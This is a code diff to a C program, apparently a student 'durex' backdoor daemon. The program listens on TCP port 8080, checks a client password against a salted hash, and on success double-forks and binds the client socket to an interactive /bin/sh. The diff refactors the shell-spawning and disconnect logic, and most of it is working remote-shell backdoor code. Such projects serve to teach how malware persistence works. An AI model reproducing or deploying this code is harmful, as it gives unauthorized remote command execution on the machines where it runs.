@@ -17,6 +17,8 @@
 #include <arpa/inet.h>
 #include <durex.h>
 #include <stdio.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 
 #define MAX_CLI_NUMBER 3
 #define PORT 8080
@@ -27,35 +29,31 @@
 /*
  * Disconnects a client and returns his connection fd.
 */
-int disconnect_client(t_cli *client)
+int disconnect_client(t_cli *client, fd_set *rset, fd_set *wset, int does_exits)
 {
 	int confd = client->confd;
 	close(client->confd);
 	memset(client, 0, sizeof(t_cli));
+	FD_CLR(confd, rset);
+	FD_CLR(confd, wset);
+	if (does_exits)
+		exit(EXIT_SUCCESS);
 	return (confd);
 }
 
 
 void spawn_shell(int confd, int sockfd)
 {
-	int pid = fork();
-
-	if (pid < 0)
-		return;
-
-	if (pid == 0)
+	for (int i = 3; i < sysconf(_SC_OPEN_MAX); i++)
 	{
-		for (int i = 3; i < sysconf(_SC_OPEN_MAX); i++)
-		{
-			if (i != confd && i != sockfd)
-				close(i);
-		}
-		dup2(confd, 0);
-		dup2(confd, 1);
-		dup2(confd, 2);
-		execve("/bin/sh", (char *[]){"sh", NULL}, NULL);
-		exit(EXIT_FAILURE);
+		if (i != confd && i != sockfd)
+			close(i);
 	}
+	dup2(confd, 0);
+	dup2(confd, 1);
+	dup2(confd, 2);
+	execve("/bin/sh", (char *[]){"sh", NULL}, NULL);
+	exit(EXIT_FAILURE);
 }
 
 /*
@@ -123,28 +121,45 @@ static int checkpass(char *buf, const char *salt, const char *hashref)
 }
 
 /*
- *
+ * Try to read data from a client.
 */
-int read_from_client(t_cli *client, int sockfd)
+void read_from_client(t_cli *client, int sockfd, fd_set *rset, fd_set *wset)
 {
 	size_t msg_len;
 	char buf[BUF_SIZE] = {0};
 
 	msg_len = recv(client->confd, buf, BUF_SIZE, 0);
-	if (msg_len == 0)
+	if (msg_len == 0 || buf[msg_len - 1] != '\n')
 	{
-		return (disconnect_client(client));
+		disconnect_client(client, rset, wset, 0);
+		return ;
 	}
 	// if (msg_len == BUF_SIZE)
 	// 	sock_flush(client.confd);
 
 	if (checkpass(buf, SALT, PASSWORD_HASH))
 	{
-		printf("coucou\n");
-		spawn_shell(client->confd, sockfd);
-		return (disconnect_client(client));
+		int pid = fork();
+		if (pid < 0)
+			client->is_typing = 0;
+		if (pid == 0)
+		{
+			int pid2 = fork();
+			if (pid2 < 0)
+				exit(EXIT_FAILURE);
+			if (pid2 == 0)
+			{
+				spawn_shell(client->confd, sockfd);
+				exit(EXIT_FAILURE);
+			}
+			waitpid(pid, (int *){0}, 0);
+			disconnect_client(client, rset, wset, 1);
+		}
 	}
-	return (0);
+	else
+	{
+		client->is_typing = 0;
+	}
 }
 
 /*
@@ -202,16 +217,7 @@ int serve(int sockfd)
 		{
 			if (FD_ISSET(clients[i].confd, &rtmp))
 			{
-				int confd = read_from_client(&clients[i], sockfd);
-				if (confd > 0)
-				{
-					FD_CLR(confd, &rset);
-					FD_CLR(confd, &wset);
-				}
-				else
-				{
-					clients[i].is_typing = 0;
-				}
+				read_from_client(&clients[i], sockfd, &rset, &wset);
 			}
 		}
 	}
